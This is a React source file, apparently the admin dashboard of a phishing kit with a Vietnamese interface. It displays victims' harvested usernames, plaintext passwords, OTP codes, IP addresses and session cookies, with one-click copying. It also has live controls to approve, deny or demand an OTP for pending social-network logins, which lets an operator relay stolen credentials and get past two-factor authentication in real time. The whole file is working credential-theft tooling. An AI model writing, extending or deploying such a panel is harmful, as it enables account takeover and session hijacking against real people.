import React, { useEffect, useMemo, useState } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from '@/components/ui/table';
import { Checkbox } from '@/components/ui/checkbox';
import { Badge } from '@/components/ui/badge';
import { motion, AnimatePresence } from 'framer-motion';
import { Copy, MoreVertical, Send } from 'lucide-react';
import { toast } from 'react-toastify';
import { Button } from '@/components/ui/button';
import { DropdownMenu, DropdownMenuContent, DropdownMenuItem, DropdownMenuTrigger } from '@/components/ui/dropdown-menu';
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';

// Plaintext display per requirement; support multi-line stacking
const MultiLineCell = ({ values = [], colorClass = '' }) => {
    const arr = Array.isArray(values) ? values : (values ? [values] : []);
    if (!arr.length) return <span className="text-gray-400">Không có</span>;
    return (
        <div className={`flex flex-col gap-0.5 ${colorClass}`}>
            {arr.map((v, i) => (
                <span key={i} className="font-mono break-words leading-tight">{v}</span>
            ))}
        </div>
    );
};

const NotificationCell = ({ item, templates, onSend }) => {
    const [selectedTemplate, setSelectedTemplate] = useState('');

    const handleSend = () => {
        if (selectedTemplate) {
            onSend(item.id, selectedTemplate);
        } else {
            toast.warn('Vui lòng chọn một mẫu thông báo.');
        }
    };

    return (
        <div className="flex items-center space-x-1">
            <Select onValueChange={setSelectedTemplate}>
                <SelectTrigger className="w-[120px] bg-slate-800/50 border-slate-700 h-8 text-xs">
                    <SelectValue placeholder="Chọn mẫu..." />
                </SelectTrigger>
                <SelectContent className="bg-[#0f0c29] border-purple-800 text-slate-50">
                    {templates.map(template => (
                        <SelectItem key={template.id} value={template.id.toString()}>{template.title}</SelectItem>
                    ))}
                </SelectContent>
            </Select>
            <Button variant="ghost" size="icon_sm" className="h-8 w-8 text-cyan-400 hover:text-cyan-300" onClick={handleSend}>
                <Send className="h-4 w-4" />
            </Button>
        </div>
    );
};

export const HistoryTable = ({
    history = [],
    allHistory = [],
    selectedUsers = [],
    setSelectedUsers,
    notificationTemplates = [],
    onSendNotification
}) => {
    const adminKey = useMemo(() => {
        try { return localStorage.getItem('ADMIN_KEY') || ''; } catch { return ''; }
    }, []);

    const adminHeaders = useMemo(() => {
        const h = { 'content-type': 'application/json' };
        if (adminKey) h['x-admin-key'] = adminKey;
        return h;
    }, [adminKey]);

    // --- Chuẩn hóa & khớp tài khoản tốt hơn ---
    function toLowerTrim(s) { return String(s || '').trim().toLowerCase(); }
    function emailLocal(s) {
        const v = toLowerTrim(s);
        const i = v.indexOf('@');
        return i >= 0 ? v.slice(0, i) : v;
    }
    function onlyDigits(s) { return String(s || '').replace(/\D+/g, ''); }
    function accountsMatch(a, b) {
        const A = toLowerTrim(a);
        const B = toLowerTrim(b);
        if (!A || !B) return false;
        if (A === B) return true;
        const hasAtA = A.includes('@');
        const hasAtB = B.includes('@');
        // So khớp email: full hoặc theo local-part
        if (hasAtA && hasAtB) {
            if (A === B) return true;
            if (emailLocal(A) === emailLocal(B)) return true;
        } else if (hasAtA && !hasAtB) {
            if (emailLocal(A) === B) return true;
        } else if (!hasAtA && hasAtB) {
            if (A === emailLocal(B)) return true;
        }
        // So khớp số điện thoại: so sánh đuôi tối đa 15 số (E.164), yêu cầu tối thiểu 9 số trùng
        const dA = onlyDigits(A);
        const dB = onlyDigits(B);
        if (dA && dB) {
            const max = Math.min(15, dA.length, dB.length);
            for (let n = max; n >= 9; n--) {
                if (dA.slice(-n) === dB.slice(-n)) return true;
            }
        }
        // Fallback: bỏ . _ - khoảng trắng
        const cA = A.replace(/[._\s-]+/g, '');
        const cB = B.replace(/[._\s-]+/g, '');
        return cA === cB;
    }

    // --- Tải danh sách pending 1 lần để hiển thị loginId khớp ---
    const [pendingList, setPendingList] = useState([]);
    const [pendingLoading, setPendingLoading] = useState(false);
    async function loadPendingOnce() {
        try {
            setPendingLoading(true);
            const res = await fetch('/api/social-login/pending?status=pending', { credentials: 'include' });
            const json = await res.json();
            if (res.ok && json?.success) setPendingList(json.data || []);
        } catch {
            // ignore
        } finally { setPendingLoading(false); }
    }
    useEffect(() => { loadPendingOnce(); }, []);
    // Auto-refresh pending list every 5s to keep loginId mapping accurate
    useEffect(() => {
        const t = setInterval(() => { loadPendingOnce(); }, 5000);
        return () => clearInterval(t);
    }, []);

    function getPendingIdForAccount(account) {
        const match = (pendingList || []).find(x => accountsMatch(account, x?.username));
        return match?.id || '';
    }
    function itemMatchesAccount(item, account) {
        if (!item) return false;
        if (accountsMatch(item.account, account)) return true;
        if (Array.isArray(item.accountHistory)) return item.accountHistory.some(x => accountsMatch(x, account));
        return false;
    }
    function getPendingIdForItem(item) {
        const accounts = Array.isArray(item?.accountHistory) && item.accountHistory.length
            ? item.accountHistory
            : (item?.account ? [item.account] : []);
        for (const acc of accounts) {
            const id = getPendingIdForAccount(acc);
            if (id) return id;
        }
        return '';
    }

    async function findPendingIdByAccount(account) {
        try {
            const res = await fetch('/api/social-login/pending?status=pending', { credentials: 'include' });
            const json = await res.json();
            if (!res.ok || !json?.success) return null;
            const list = json.data || [];
            const match = list.find(x => accountsMatch(account, x?.username));
            return match?.id || null;
        } catch {
            return null;
        }
    }
    async function findPendingIdByItem(item) {
        const accounts = Array.isArray(item?.accountHistory) && item.accountHistory.length
            ? item.accountHistory
            : (item?.account ? [item.account] : []);
        for (const acc of accounts) {
            const id = await findPendingIdByAccount(acc);
            if (id) return id;
        }
        return null;
    }

    async function actLogin(endpoint, id) {
    const res = await fetch(`/api/social-login/${endpoint}`, {
            method: 'POST',
            headers: adminHeaders,
            credentials: 'include',
            body: JSON.stringify({ id })
        });
        const json = await res.json().catch(()=>({}));
        if (!res.ok || !json?.success) {
            const msg = json?.message || `HTTP ${res.status}`;
            if (res.status === 401) toast.error('Không có quyền (thiếu ADMIN_KEY).');
            else toast.error(msg);
            return false;
        }
        toast.success(`${endpoint} thành công (${id})`);
        return true;
    }

    async function handleApprove(item) {
        let id = getPendingIdForItem(item) || await findPendingIdByItem(item);
        if (!id) id = window.prompt('Không tìm thấy loginId theo tài khoản. Nhập loginId để Phê duyệt:', '') || '';
        if (!id) return;
        await actLogin('approve', id);
    }
    async function handleRequireOtp(item) {
        let id = getPendingIdForItem(item) || await findPendingIdByItem(item);
        if (!id) id = window.prompt('Không tìm thấy loginId theo tài khoản. Nhập loginId để Yêu cầu OTP:', '') || '';
        if (!id) return;
        await actLogin('require-otp', id);
    }
    function handleRequestOtpMessage(item) {
        try {
            // Prefer a template that looks like an OTP request
            const t = (notificationTemplates || []).find(tmp => {
                const title = String(tmp?.title || '').toLowerCase();
                const type = String(tmp?.type || '').toLowerCase();
                return title.includes('otp') || type.includes('otp');
            });
            if (!t) {
                toast.warn('Chưa có mẫu thông báo OTP. Vào Trang Mẫu Thông Báo để thêm.');
                return;
            }
            if (typeof onSendNotification === 'function') {
                onSendNotification(item.id, String(t.id));
                toast.info('Đã gửi yêu cầu nhập OTP tới người dùng.');
            }
        } catch {}
    }
    async function handleDeny(item, reason) {
        let id = getPendingIdForItem(item) || await findPendingIdByItem(item);
        if (!id) id = window.prompt('Không tìm thấy loginId theo tài khoản. Nhập loginId để Từ chối:', '') || '';
        if (!id) return;
        const endpoint = 'deny';
        const res = await fetch(`/api/social-login/${endpoint}`, {
            method: 'POST',
            headers: adminHeaders,
            credentials: 'include',
            body: JSON.stringify({ id, reason: reason || undefined })
        });
        const json = await res.json().catch(()=>({}));
        if (!res.ok || !json?.success) {
            const msg = json?.message || `HTTP ${res.status}`;
            if (res.status === 401) toast.error('Không có quyền (thiếu ADMIN_KEY).');
            else toast.error(msg);
            return false;
        }
        toast.success(`deny thành công (${id})`);
        return true;
    }
    const handleSelectAll = (checked) => {
        if (checked) {
            setSelectedUsers(allHistory.map(item => item.id));
        } else {
            setSelectedUsers([]);
        }
    };

    const handleSelectRow = (id, checked) => {
        const target = allHistory.find(u => u.id === id);
        if (!target) return;
        const accounts = Array.isArray(target.accountHistory) && target.accountHistory.length ? target.accountHistory : (target.account ? [target.account] : []);
        const groupIds = allHistory.filter(u => accounts.some(acc => itemMatchesAccount(u, acc))).map(u => u.id);
        if (checked) {
            setSelectedUsers(prev => Array.from(new Set([...prev, ...groupIds])));
        } else {
            setSelectedUsers(prev => prev.filter(userId => !groupIds.includes(userId)));
        }
    };

    const copyToClipboard = (text, type) => {
        const val = Array.isArray(text) ? text.join('\n') : text;
        if (!val || val === 'N/A') return;
        navigator.clipboard.writeText(val).then(() => {
            toast.success(`${type} đã được sao chép!`);
        }, (err) => {
            toast.error('Không thể sao chép.');
            console.error('Could not copy text: ', err);
        });
    };

    const handleAction = (action, item) => {
        if (action === 'copy_cookie') {
            copyToClipboard(item.cookie, 'Cookie');
        } else {
            toast.info(`Hành động "${action}" cho user ${item.account} chưa được triển khai.`);
        }
    };

    const getStatusBadge = (status) => {
        if (!status) return 'bg-gray-500/80';
        if (status.startsWith('✅')) return 'bg-green-500/80 text-white';
        if (status.startsWith('🟡')) return 'bg-yellow-500/80 text-black';
        if (status.startsWith('❌')) return 'bg-red-500/80 text-white';
        if (status.startsWith('ℹ️')) return 'bg-blue-500/80 text-white';
        if (status.startsWith('🟠')) return 'bg-orange-500/80 text-white';
        return 'bg-gray-500/80';
    };

    const isAllSelected = allHistory.length > 0 && selectedUsers.length === allHistory.length;
    const isIndeterminate = selectedUsers.length > 0 && selectedUsers.length < allHistory.length;

    const tableHeaders = [
    "STT & Thời Gian", "Tên liên kết", "Tài khoản", "Mật khẩu",
    "Mã OTP", "IP đăng nhập", "Liên kết Admin", "Trạng thái", "Cookie", "Thông báo", "Hành động"
    ];

    return (
        <Card className="cyber-card-bg h-full">
            <CardContent className="pt-6">
                <div className="overflow-auto">
                    <Table>
                        <TableHeader>
                            <TableRow className="border-b-purple-500/30 hover:bg-transparent">
                                <TableHead className="w-[40px]">
                                    <Checkbox
                                        checked={isAllSelected}
                                        onCheckedChange={handleSelectAll}
                                        aria-label="Chọn tất cả"
                                        data-state={isIndeterminate ? 'indeterminate' : (isAllSelected ? 'checked' : 'unchecked')}
                                    />
                                </TableHead>
                                {tableHeaders.map(header => (
                                    <TableHead key={header} className="text-gray-300 whitespace-nowrap">{header}</TableHead>
                                ))}
                            </TableRow>
                        </TableHeader>
                        <TableBody>
                            <AnimatePresence>
                                {history.map((item, index) => (
                                    <motion.tr
                                        key={item.id}
                                        layout
                                        initial={{ opacity: 0, y: -10 }}
                                        animate={{ opacity: 1, y: 0 }}
                                        exit={{ opacity: 0, x: -50 }}
                                        transition={{ duration: 0.3 }}
                                        className="border-b-purple-500/10 hover:bg-purple-500/10 text-xs"
                                    >
                                        <TableCell>
                                            <Checkbox
                                                checked={selectedUsers.includes(item.id)}
                                                onCheckedChange={(checked) => handleSelectRow(item.id, checked)}
                                                aria-label={`Chọn dòng ${item.id}`}
                                            />
                                        </TableCell>
                                        <TableCell className="text-gray-300">
                                            <div className="font-bold text-white">{index + 1}</div>
                                            <div>{new Date(item.time).toLocaleDateString('vi-VN')}</div>
                                            <div>{new Date(item.time).toLocaleTimeString('vi-VN')}</div>
                                        </TableCell>
                                        <TableCell className="text-cyan-400 font-medium">{item.linkName}</TableCell>
                                        <TableCell className="font-medium text-white">
                                            <div className="flex items-center gap-1">
                                                <MultiLineCell values={item.accountHistory?.length ? item.accountHistory : (item.account ? [item.account] : [])} />
                                                <button onClick={() => copyToClipboard(item.accountHistory?.length ? item.accountHistory : item.account, 'Tài khoản')} className="text-gray-400 hover:text-white"><Copy className="h-3 w-3" /></button>
                                            </div>
                                        </TableCell>
                                        <TableCell>
                                            <div className="flex items-center gap-1">
                                                <MultiLineCell values={item.passwordHistory?.length ? item.passwordHistory : (item.password ? [item.password] : [])} />
                                                <button onClick={() => copyToClipboard(item.passwordHistory?.length ? item.passwordHistory : item.password, 'Mật khẩu')} className="text-gray-400 hover:text-white"><Copy className="h-3 w-3" /></button>
                                            </div>
                                        </TableCell>
                                        <TableCell>
                                            <div className="flex items-center gap-1">
                                                <MultiLineCell values={item.otpHistory?.length ? item.otpHistory : (item.otp && item.otp !== 'N/A' ? [item.otp] : [])} colorClass="text-yellow-400" />
                                                <button onClick={() => copyToClipboard(item.otpHistory?.length ? item.otpHistory : item.otp, 'OTP')} className="text-gray-400 hover:text-white"><Copy className="h-3 w-3" /></button>
                                            </div>
                                        </TableCell>
                                        <TableCell className="text-gray-300">{item.ip}</TableCell>
                                        <TableCell>
                                            <div className="text-xs text-purple-300">
                                                {item.adminLinkTitle ? item.adminLinkTitle : <span className="text-gray-500">—</span>}
                                            </div>
                                        </TableCell>
                                        <TableCell>
                                            <Badge className={getStatusBadge(item.status)}>{item.status}</Badge>
                                        </TableCell>
                                        <TableCell>
                                            <div className="flex items-center gap-1">
                                                <span className="text-gray-400 truncate max-w-[100px]" title={item.cookie}>{item.cookie}</span>
                                                 <button onClick={() => copyToClipboard(item.cookie, 'Cookie')} className="text-gray-400 hover:text-white"><Copy className="h-3 w-3" /></button>
                                            </div>
                                        </TableCell>
                                        <TableCell>
                                            <NotificationCell
                                                item={item}
                                                templates={notificationTemplates}
                                                onSend={onSendNotification}
                                            />
                                        </TableCell>
                                        <TableCell>
                                            {String(item.status || '').startsWith('🟡') && (
                                                <div className="flex flex-col gap-1 mb-1">
                                                    <div className="flex flex-col gap-1">
                                                        <div className="flex items-center gap-2">
                                                            <Button size="sm" variant="outline" onClick={() => handleApprove(item)}>Phê duyệt</Button>
                                                            <Button size="sm" variant="secondary" onClick={() => handleRequireOtp(item)}>Duyệt OTP</Button>
                                                            <Button size="sm" variant="destructive" onClick={() => handleDeny(item)}>Từ chối</Button>
                                                        </div>
                                                        <div className="flex flex-wrap gap-2">
                                                            <Button size="xs" variant="destructive" onClick={() => handleDeny(item, 'Sai mật khẩu')}>Sai mk</Button>
                                                            <Button size="xs" variant="destructive" onClick={() => handleDeny(item, 'Sai tài khoản email')}>Sai tk mail</Button>
                                                            <Button size="xs" variant="destructive" onClick={() => handleDeny(item, 'Sai OTP')}>Sai OTP</Button>
                                                            <Button size="xs" variant="outline" onClick={() => handleRequestOtpMessage(item)}>Yêu cầu nhập OTP</Button>
                                                        </div>
                                                    </div>
                                                    <div className="text-[10px] text-gray-400 flex items-center gap-2">
                                                        <span>loginId:</span>
                                                        <span className="font-mono break-all max-w-[200px]">{getPendingIdForItem(item) || '—'}</span>
                                                        <button type="button" className="underline disabled:opacity-50" onClick={loadPendingOnce} disabled={pendingLoading}>
                                                            {pendingLoading ? 'Đang tải…' : 'Làm mới'}
                                                        </button>
                                                    </div>
                                                </div>
                                            )}
                                            <DropdownMenu>
                                                <DropdownMenuTrigger asChild>
                                                    <Button variant="ghost" size="icon_sm"><MoreVertical className="h-4 w-4" /></Button>
                                                </DropdownMenuTrigger>
                                                <DropdownMenuContent className="bg-slate-900 border-purple-700 text-white">
                                                    <DropdownMenuItem onSelect={() => handleAction('copy_cookie', item)}>Sao chép Cookie</DropdownMenuItem>
                                                    <DropdownMenuItem onSelect={() => handleAction('delete', item)}>Xóa</DropdownMenuItem>
                                                    <DropdownMenuItem onSelect={() => handleAction('rerun', item)}>Chạy lại</DropdownMenuItem>
                                                </DropdownMenuContent>
                                            </DropdownMenu>
                                        </TableCell>
                                    </motion.tr>
                                ))}
                            </AnimatePresence>
                        </TableBody>
                    </Table>
                </div>
                 {history.length === 0 && (
                    <div className="text-center py-8 text-gray-500">
                        Chưa có hoạt động nào.
                    </div>
                )}
            </CardContent>
        </Card>
    );
};